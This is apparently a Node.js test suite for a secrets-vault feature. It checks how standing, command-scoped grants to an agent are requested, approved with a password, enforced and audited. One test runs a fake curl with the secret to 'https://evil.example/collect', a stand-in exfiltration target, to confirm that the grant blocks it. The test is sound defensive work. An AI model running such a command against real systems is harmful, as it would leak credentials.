#!/usr/bin/env node
/**
 * LANE vault-standing-request (the owner 2026-10-30, four «允许一次» cards in two minutes for `python3 transcribe.py partNN.mp3`,
 * each saying «发往 未知 … 不提供「总是允许」：发往何处未知»: 「能不能让 agent 自行申请权限，我手填填不明白 … 我的意思是常驻的，跟我配
 * "谁可以用"等效的权限」). FAST — a real vault engine (scratch, set up + unlocked), a real grants store on disk, the ONE writer
 * (src/server/vault-use-grants.js), the run door, the For-you store; fake tools in a read-only folder. Every rule a named leg:
 *   ① a STANDING request (`request --standing`) files ONE card; its Allow (验证是你) writes THE SAME vault-use member the row's
 *     «谁可以用» writes (source 'request', no end); the same scope is asked once while open; Deny quiets it 10 min; a plain
 *     request keeps once / 8h; a lock does not end the grant (the lock refuses the run).
 *   ② the run card of a command whose destination cannot be read offers «Always (this command)» = a standing grant on the
 *     COMMAND SHAPE (program real path + script real path + its sha256); a changed script / program = a new shape = a card; a
 *     late card still offers no «Always».
 *   ③ the scope is enforced: hosts-only ⇒ an unreadable destination still cards; a command grant admits exactly its shape
 *     (never a known tool); the row says its scope.
 *   ④ the agent is told the recipe (a run let through once, a card nobody answered); list / uses say «standing».
 *   ⑤ every use under it is a vault-use line naming the grant; the lock refuses, the grant stays.
 * Each leg is guarded (a base tree without the feature fails BY NAME, never by a crash) — the RED control runs this file
 * against the base's src (report.md).
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { createRequire } from 'node:module';
import { scratch } from './scratch.mjs';

const require = createRequire(import.meta.url);
const REPO = path.resolve(new URL('..', import.meta.url).pathname);
const VR = require(path.join(REPO, 'src/vault-run.js'));
const VE = require(path.join(REPO, 'src/server/vault-engine.js'));
const VC = require(path.join(REPO, 'src/server/vault-contents.js'));
const GS = require(path.join(REPO, 'src/server/grants-store.js'));
const UG = require(path.join(REPO, 'src/server/vault-use-grants.js'));
const DOOR = require(path.join(REPO, 'src/server/vault-run-door.js'));
const { UserTodoManager } = require(path.join(REPO, 'src/user-todos.js'));

let pass = 0, fail = 0;
const ok = (c, n, e) => { if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.error('  ✗ ' + n + (e !== undefined ? '\n    ' + (typeof e === 'string' ? e : JSON.stringify(e)).slice(0, 900) : '')); } };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
/** A leg: an exception is a FAILED leg by name (a base tree without the feature), never a crash of the suite. */
async function leg(name, fn) { try { await fn(); } catch (e) { fail++; console.error(`  ✗ ${name} — threw: ${String(e && e.stack || e).split('\n').slice(0, 3).join(' | ')}`); } }

const ROOT = scratch('vault-standing');
fs.rmSync(ROOT, { recursive: true, force: true }); fs.mkdirSync(ROOT, { recursive: true });
const PW = 'second password for the standing-request suite';
const BIN = path.join(ROOT, 'bin');
fs.mkdirSync(BIN, { recursive: true });
for (const t of ['curl', 'python3', 'sh', 'mytool']) fs.writeFileSync(path.join(BIN, t), `#!/usr/bin/env node\nprocess.stdout.write('${t} ran ' + (process.env.T ? 'with T' : 'without T') + ' for ' + process.argv.slice(2).join(' ') + '\\n');\n`, { mode: 0o555 });
fs.chmodSync(BIN, 0o555);   // read-only, declared root-owned below: programWritable is false (psha null)
process.on('exit', () => { try { fs.chmodSync(BIN, 0o755); fs.rmSync(ROOT, { recursive: true, force: true }); } catch { } });
const VALUE = ['tts', 'api', 'key', crypto.randomBytes(8).toString('hex')].join('-');   // built at runtime (never a literal secret)
const CID = 'cid-transcriber-1';

let worldN = 0;
async function world({ instance = 'cluster', timers } = {}) {
  const dir = path.join(ROOT, 'w' + (++worldN)); const dataDir = path.join(dir, 'data'), work = path.join(dir, 'work'), runRoot = path.join(dir, 'run');
  for (const d of [dataDir, work, runRoot]) fs.mkdirSync(d, { recursive: true });
  fs.writeFileSync(path.join(work, 'transcribe.py'), 'import os, sys\nprint("segment", sys.argv[1:])\n');
  fs.writeFileSync(path.join(work, 'other.py'), 'print("other")\n');
  const frames = [];
  const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: { log() {}, warn() {} }, idleTimer: false, register: false, bcast: (m) => frames.push(m) });
  await vault.setup(PW);
  const userTodos = new UserTodoManager({ dataDir, expirySweepMs: 3600e3 });
  const grants = GS.create({ dataDir });
  const logs = [];
  const useGrants = UG.create({ grants: () => grants, vault, dataDir, log: (m) => logs.push(String(m)) });
  const sources = { secrets: () => VC.secretSource({ vault }) };
  const facts = (caller) => ({ conversationKeys: [caller.conversationId], groupIds: [] });
  const door = DOOR.create({ dataDir, vault, userTodos, sources, instanceKind: () => instance, runRoot: () => runRoot, home: os.homedir(), agentEnv: () => ({ ...process.env, PATH: BIN + ':' + process.env.PATH }), killGraceMs: 400, pipeGraceMs: 300, liveOf: () => true, log: (m) => logs.push(String(m)), useGrants, useFacts: facts, isRootOwned: (p) => p === BIN || String(p).startsWith(BIN + '/'), ...(timers ? { timers } : {}) });
  const caller = (cid = CID, name = 'Transcriber') => ({ conversationId: cid, sessionKey: `claude:${cid}`, name, cwd: work, scope: cid });
  const name = 'secret:' + crypto.randomBytes(5).toString('hex');
  const put = vault.secretPut(name, VALUE, { prov: 'owner', label: 'TTS API key', kind: 'api-key', hosts: [] });
  if (!put.ok) throw new Error('secretPut ' + put.code);
  const e = { name, id: `secrets:${name}#secret`, ref: `vault://secrets/${name}/secret` };
  return { dir, dataDir, work, vault, userTodos, grants, useGrants, door, logs, frames, caller, e };
}
const openOf = (w, type) => (w.userTodos.snapshot().open || []).filter((i) => i.action && i.action.type === type);
const cardsOf = (w) => openOf(w, 'vault-run-ask');
const RUN = (ref, ...argv) => ['--env', `T=${ref}`, '--', ...argv];
async function runAnswered(w, args, { answer = null, reauthed = false, caller = w.caller(), door = w.door, leave = false } = {}) {
  let settled = false;
  const before = new Set(cardsOf(w).map((c) => c.id));
  const p = door.run({ caller, args, cwd: w.work }).then((r) => { settled = true; return r; });
  let card = null;
  const t = Date.now();
  while (!settled && Date.now() - t < 3000) { const c = cardsOf(w).filter((x) => !before.has(x.id)); if (c.length) { card = c[c.length - 1]; break; } await sleep(5); }
  let a = null;
  if (card && answer) a = door.answer(card.action.askId, { answer, reauthed });
  if (card && !leave && (!answer || (a && !a.ok))) door.answer(card.action.askId, { answer: 'deny' });
  return { r: await p, card, a };
}
const memberOf = (w, cid = CID) => { const [row] = w.grants.rowsFor('vault-use', w.e.id); return row ? (row.to || []).find((m) => m.key === cid) || null : null; };
const useLines = (w) => { try { return fs.readFileSync(path.join(w.dataDir, 'vault-audit.jsonl'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)).filter((x) => x.event === 'vault-use'); } catch { return []; } };
const sha = (p) => crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex');

console.log('① A STANDING REQUEST — one card, the owner\'s Allow writes THE row «谁可以用» writes (source request, no end)');
await leg('① standing request', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });   // the owner's switch: the card asks per command (his screenshot)
  const q = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'transcribe 40 audio segments with the TTS service', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  const card = openOf(w, 'vault-grant-ask').find((i) => q && i.action.askId === q.askId);
  ok(!!(q && q.ok && card && card.action.standing === true), '①a `request --standing --command "python3 transcribe.py"` files ONE For-you card marked standing (its answers: Allow (standing) / Deny)', { q, action: card && card.action });
  ok(!!(card && /asks for a standing grant/.test(card.text) && /For the command python3 transcribe\.py/.test(card.detail) && /Until you revoke it/.test(card.detail) && card.detail.includes(fs.realpathSync(path.join(BIN, 'python3'))) && card.detail.includes(fs.realpathSync(path.join(w.work, 'transcribe.py')))), '①b the card says WHO asks, for WHICH command (the program\'s and the script\'s real paths), and «until you revoke it»', card && { text: card.text, detail: card.detail });
  const dup = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'again', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  ok(!!(dup && !dup.ok && dup.code === 'request_pending'), '①c the same (conversation, entry, scope) is asked ONCE while open ⇒ request_pending', dup);
  const once = q && w.door.answerRequest(q.askId, { answer: 'once', reauthed: true });
  ok(!!(once && !once.ok && once.code === 'bad_grant_answer'), '①d a standing request is never answered once / 8h (bad_grant_answer — the card stays up)', once);
  const noPw = q && w.door.answerRequest(q.askId, { answer: 'standing', reauthed: false });
  ok(!!(noPw && !noPw.ok && noPw.code === 'reveal_needs_password' && !memberOf(w)), '①e Allow needs 验证是你 (reveal_needs_password; nothing written)', noPw);
  const yes = q && w.door.answerRequest(q.askId, { answer: 'standing', reauthed: true, person: true });
  const m = memberOf(w);
  const tok = m && m.commands && m.commands[0];
  ok(!!(yes && yes.ok && yes.grantedFor === 'standing' && m && m.source === 'request' && !m.until && !m.hosts && tok && tok.program === fs.realpathSync(path.join(BIN, 'python3')) && tok.arg === fs.realpathSync(path.join(w.work, 'transcribe.py')) && tok.sha === sha(path.join(w.work, 'transcribe.py'))), '①f the Allow writes THE vault-use member (door vault-use, resource = the entry, to = the conversation): the command shape {program, script, sha256}, source «request», NO end', { yes, m });
  const rec = (w.userTodos.snapshot().resolved || []).find((i) => q && i.action && i.action.askId === q.askId);
  ok(!!(rec && rec.resolvedBy === 'granted' && rec.resolvedFact && rec.resolvedFact.grantedFor === 'standing'), '①g the card\'s record says granted · standing («allowed by you until you revoke it»)', rec && { by: rec.resolvedBy, fact: rec.resolvedFact });
  const runs = [];
  for (const part of ['part01.mp3', 'part02.mp3', 'part03.mp3']) runs.push(await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', part)));
  ok(runs.every((x) => x.r.ok && x.r.allowedBy !== undefined ? true : x.r.ok) && runs.every((x) => !x.card), '①h every later segment runs with NO card (the owner\'s loop of 40 is one Allow)', runs.map((x) => ({ ok: x.r.ok, code: x.r.code, card: !!x.card })));
  const lines = useLines(w).filter((l) => l.door === 'run' && l.outcome === 'ok');
  ok(lines.length >= 3 && lines.slice(-3).every((l) => /^vg-[0-9a-f]{8}$/.test(String(l.grant))) && !JSON.stringify(lines).includes(VALUE), '⑤a each of those uses is a vault-use line naming the STANDING grant it rode (by grant · standing) — never the value', lines.slice(-3).map((l) => ({ grant: l.grant, outcome: l.outcome })));
  w.vault.lock();
  const locked = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', 'part04.mp3'));
  ok(!locked.r.ok && locked.r.code === 'vault_locked' && w.grants.rowsFor('vault-use', w.e.id).length === 1, '①i/⑤b a LOCK refuses the run (vault_locked) and does NOT end the grant — the row stays (it is the owner\'s row, not an 8-hour grant)', { code: locked.r.code, rows: w.grants.rowsFor('vault-use', w.e.id).length });
  await w.vault.unlock(PW);
  const after = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', 'part05.mp3'));
  ok(after.r.ok && !after.card, '①j unlocked again: the next segment runs with no card — the standing grant held through the lock', { ok: after.r.ok, code: after.r.code });
  const uses = w.door.usesFor(w.caller());
  const st = uses && uses.standing && uses.standing[0];
  ok(!!(st && st.entry === w.e.ref && st.commands.join() === 'python3 transcribe.py' && st.source === 'request' && st.since), '④a `vibespace-vault uses` lists it: standing · the command python3 transcribe.py · since <when>', uses && uses.standing);
  const list = w.door.runnableFor(w.caller());
  const le = list && (list.entries || []).find((x) => x.ref === w.e.ref);
  ok(!!(le && le.by === 'standing' && (le.commands || []).join() === 'python3 transcribe.py' && le.since), '④b `vibespace-vault list` says standing + its scope + since', le);
});

console.log('①\' the request road\'s other edges — a hosts scope, Deny quiets 10 min, refusals by name, a plain request unchanged');
await leg('① edges', async () => {
  const w = await world();
  const h = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'call the TTS API', standing: true, hosts: ['api.tts.example'], cwd: w.work });
  const c2 = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'the transcriber', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  ok(!!(h && h.ok && c2 && c2.ok && h.askId !== c2.askId), '①k another SCOPE of the same entry is its own question (hosts vs the command) — both filed', { h, c2 });
  const den = c2 && w.door.answerRequest(c2.askId, { answer: 'deny' });
  const again = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'please', standing: true, command: 'python3 transcribe.py', cwd: w.work });
  ok(!!(den && den.ok && again && !again.ok && again.code === 'request_quiet'), '①l Deny quiets the same ask for 10 minutes (request_quiet), as today', { den, again });
  const yes = h && w.door.answerRequest(h.askId, { answer: 'standing', reauthed: true });
  const m = memberOf(w);
  ok(!!(yes && yes.ok && m && (m.hosts || []).join() === 'api.tts.example' && m.source === 'request' && !m.until), '①m a hosts-scoped Allow writes the member with those hosts (the row\'s «主机»), source request, no end', m);
  const curl = await runAnswered(w, RUN(w.e.ref, 'curl', 'https://api.tts.example/v1/tts'));
  ok(curl.r.ok && !curl.card, '①n a command to a granted host runs with no card (the entry\'s switch flipped in the same act, only this member resumed)', { ok: curl.r.ok, code: curl.r.code });
  const none = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, cwd: w.work });
  const known = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, command: 'curl https://api.tts.example/', cwd: w.work });
  const inline = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, command: 'python3 -c', cwd: w.work });
  const missing = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, command: 'python3 nowhere.py', cwd: w.work });
  const anyHost = await w.door.request({ caller: w.caller(), entry: w.e.ref, purpose: 'x', standing: true, hosts: ['*'], cwd: w.work });
  ok([none, known, inline, missing, anyHost].map((x) => x && x.code).join() === 'scope_required,command_has_hosts,command_unreadable,command_unreadable,standing_bad_host', '①o refused BY NAME: no scope, a known tool by --command (its hosts are read — ask --host), inline code (-c), a script that is not there, «any host»', [none, known, inline, missing, anyHost].map((x) => x && x.code));
  const w3 = await world();   // a CLOSED entry (no switch, no grant) — the plain road asks
  const plain = w3.door.request({ caller: w3.caller('cid-plain-2', 'Plain'), entry: w3.e.ref, purpose: 'one run please' });
  const pr = await Promise.resolve(plain);
  const p8 = pr && pr.askId && w3.door.answerRequest(pr.askId, { answer: '8h', reauthed: true });
  ok(!!(pr && pr.ok && p8 && p8.ok && p8.grantedFor === '8h'), '①p a PLAIN request keeps once / 8h (the old road unchanged)', { pr, p8 });
});

console.log('② THE CARD\'S «Always (this command)» — where the destination cannot be read');
await leg('② card always (this command)', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const a = await runAnswered(w, RUN(w.e.ref, 'python3', 'other.py', 'seg1.mp3'), { answer: 'always', reauthed: true });
  const act = a.card && a.card.action;
  ok(!!(act && act.always === true && act.command === true), '②a the card of an interpreter + its script OFFERS «Always (this command)» (action.always + action.command)', act);
  ok(!!(a.card && a.card.detail.includes('«Always (this command)» means you trust this command itself') && !/«Always» is not offered/.test(a.card.detail) && a.card.facts && a.card.facts.always && a.card.facts.always.command && a.card.facts.always.command.offered === true && a.card.facts.always.command.words === 'python3 other.py'), '②b the card says it plainly: VibeSpace cannot see where it sends the secret; «Always» = trust THIS command; a changed program or script asks again (detail + facts)', a.card && { detail: a.card.detail.split('\n').slice(-3), facts: a.card.facts && a.card.facts.always });
  const m = memberOf(w);
  ok(!!(a.a && a.a.ok && a.r.ok && m && m.source === 'card' && !m.until && m.commands && m.commands[0].arg === fs.realpathSync(path.join(w.work, 'other.py'))), '②c its «Always» writes a standing member on the COMMAND SHAPE (source card, no end)', { a: a.a, m });
  const b = await runAnswered(w, RUN(w.e.ref, 'python3', 'other.py', 'seg2.mp3'));
  ok(b.r.ok && !b.card, '②d the next run of that command (another argument) runs with no card', { ok: b.r.ok, code: b.r.code });
  fs.writeFileSync(path.join(w.work, 'other.py'), 'print("other, changed")\n');
  const c = await runAnswered(w, RUN(w.e.ref, 'python3', 'other.py', 'seg3.mp3'));
  ok(!!c.card, '②e the script\'s bytes changed ⇒ a new shape ⇒ the card again', { card: !!c.card, code: c.r.code });
  const d = await runAnswered(w, RUN(w.e.ref, 'sh', 'other.py'));
  ok(!!d.card, '②f another program over the same script ⇒ a new shape ⇒ the card', { card: !!d.card, code: d.r.code });
  const inl = await runAnswered(w, RUN(w.e.ref, 'python3', '-c', 'print(1)'));
  ok(!!(inl.card && inl.card.action.always === false && !inl.card.action.command), '②g inline code (python3 -c …) offers NO «Always» — no command to trust', inl.card && inl.card.action);
});

console.log('②\' the deadline card unchanged — an expired card stays, a late allow is a once-pass, never «Always»');
await leg('② deadline', async () => {
  const fast = { set: (fn, ms) => setTimeout(fn, ms === VR.ASK_TTL_MS ? 60 : ms), clear: (h) => clearTimeout(h) };
  const w = await world({ timers: fast });
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const x = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', 'late.mp3'), { leave: true });
  await sleep(120);
  const r = x.r;
  ok(!r.ok && r.code === 'ask_expired' && /--standing --command/.test(String(r.words || '')) && /python3 transcribe\.py/.test(String(r.words || '')), '④c a card nobody answered in time (ask_expired) names the RECIPE: vibespace-vault request <ref> --standing --command "python3 transcribe.py"', { code: r.code, words: r.words });
  const late = (w.userTodos.snapshot().open || []).find((i) => i.action && i.action.type === 'vault-run-ask' && i.action.late);
  const al = late && w.door.answer(late.action.askId, { answer: 'always', reauthed: true });
  ok(!!(late && al && !al.ok && al.code === 'always_not_offered'), '②h a LATE card offers no «Always» (its door refuses it — the deadline rule unchanged)', { late: !!late, al });
});

console.log('③ THE SCOPE IS ENFORCED WHERE IT CAN BE');
await leg('③ scope', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  w.useGrants.addMember(w.e.id, { kind: 'conversation', key: CID, name: 'Transcriber' }, { hosts: ['api.tts.example'], source: 'owner' });
  const py = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', 'x.mp3'));
  ok(!!py.card, '③a a HOSTS-only grant + a command whose destination cannot be read ⇒ the card still asks (the grant did not cover it)', { card: !!py.card, code: py.r.code });
  const w2 = await world();
  w2.door.setRunnable({ id: w2.e.id, on: true, reauthed: true });
  const q = await w2.door.request({ caller: w2.caller(), entry: w2.e.ref, purpose: 'transcribe', standing: true, command: 'python3 transcribe.py', cwd: w2.work });
  q && w2.door.answerRequest(q.askId, { answer: 'standing', reauthed: true });
  const curl = await runAnswered(w2, RUN(w2.e.ref, 'curl', 'https://evil.example/collect'));
  ok(!!curl.card, '③b a COMMAND grant never admits another command — a known tool (curl) to any host draws its card', { card: !!curl.card, code: curl.r.code });
  const pub = w2.useGrants.publicFor(w2.e.id);
  const pm = pub && (pub.to || [])[0];
  ok(!!(pm && Array.isArray(pm.commands) && pm.commands.length === 1 && (pm.hosts || []).length === 0 && pm.source === 'request' && pm.at > 0), '③c the row says which scope it has (the window\'s chips: commands / hosts, its source and when)', pm);
  const pcs = (pm && Array.isArray(pm.commands) && pm.commands.length) ? pm.commands : [{ program: '/usr/bin/python3', arg: null, sha: null, psha: null }];   // a base without command members still reaches these legs by name
  const save = w2.useGrants.setRow(w2.e.id, { to: [{ kind: 'conversation', key: CID, commands: pcs, source: pm && pm.source, at: pm && pm.at }, { kind: 'conversation', key: 'cid-owner-9', hosts: ['api.tts.example'] }], except: [] }, { reauthed: true });
  const kept = memberOf(w2), added = memberOf(w2, 'cid-owner-9');
  ok(!!(save && save.ok && kept && kept.commands && kept.commands.length === 1 && kept.source === 'request' && added && added.source === 'owner'), '③d the owner\'s «谁可以用…» Save keeps a command member as it is (its source stays) and marks a member he ADDS «你设置的»', { save, kept, added });
  const widen = w2.useGrants.setRow(w2.e.id, { to: [{ kind: 'conversation', key: CID, commands: [...pcs, { program: pcs[0].program, arg: 'free-word', sha: null, psha: null }] }, { kind: 'conversation', key: 'cid-owner-9', hosts: ['api.tts.example'] }], except: [] }, { reauthed: false });
  ok(!!(widen && !widen.ok && widen.code === 'reveal_needs_password'), '③e a Save that ADDS a command widens ⇒ 验证是你', widen);
});

console.log('④ THE AGENT IS TOLD THE RECIPE — a run let through once names the standing road');
await leg('④ recipe', async () => {
  const w = await world();
  w.door.setRunnable({ id: w.e.id, on: true, reauthed: true });
  const once = await runAnswered(w, RUN(w.e.ref, 'python3', 'transcribe.py', 'p1.mp3'), { answer: 'once' });
  ok(once.r.ok && /request .* --standing --command "python3 transcribe\.py"/.test(String(once.r.next || '')), '④d a run the owner let through ONCE carries `next`: ask once for a standing grant (the CLI prints it)', { ok: once.r.ok, next: once.r.next });
  const cli = fs.readFileSync(path.join(REPO, 'data/bin/vibespace-vault'), 'utf8');
  ok(/request <vault:\/\/…> --standing --for/.test(cli) && /d\.next/.test(cli) && /standing · \$\{standingScope/.test(cli), '④e the CLI: the usage names --standing, `run` prints `next`, `uses` / `list` say «standing · <scope> · since»');
});

console.log(`\n${fail ? 'FAILED' : 'ALL PASS'} (${pass} passed, ${fail} failed)`);
process.exit(fail ? 1 : 0);
